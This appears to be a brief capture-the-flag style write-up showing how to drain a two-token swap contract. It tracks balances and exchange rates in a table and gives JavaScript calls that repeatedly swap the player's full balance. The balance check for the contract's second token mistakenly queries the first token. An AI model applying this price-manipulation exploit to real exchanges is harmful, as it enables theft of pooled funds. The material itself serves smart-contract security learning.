Swap Simulation

| Player Token1 | Player Token2 | Contract Token1 | Contract Token2 |   Rate  Token1   |   Rate  Token2   |                                                 |
|---------------|---------------|-----------------|-----------------|------------------|------------------|-------------------------------------------------|
|            10 |            10 |             100 |             100 |                1 |                1 |                                                 |
|             0 |            20 |             110 |              90 | (110/90) = 1.222 |                  | -> if we swap 20 token we get 24.44 = 24(uint). |
|            24 |             0 |              86 |             110 |                  | (110/86) = 1.279 | -> if we swap 24 token we get 30.696 = 30(uint) |

so if we trade max amount we can deplete all token



```js
// Check Balance for player
(await contract.balanceOf(t1, player)).toString();
(await contract.balanceOf(t2, player)).toString();

// Check Balance for contract
(await contract.balanceOf(t1, contract.address)).toString();
(await contract.balanceOf(t1, contract.address)).toString();

// Script to swap max t1->t2
await contract.swap(t1, t2, (await contract.balanceOf(t1, player)));

// Script to swap max t2->t1
await contract.swap(t2, t1, (await contract.balanceOf(t2, player)));
```
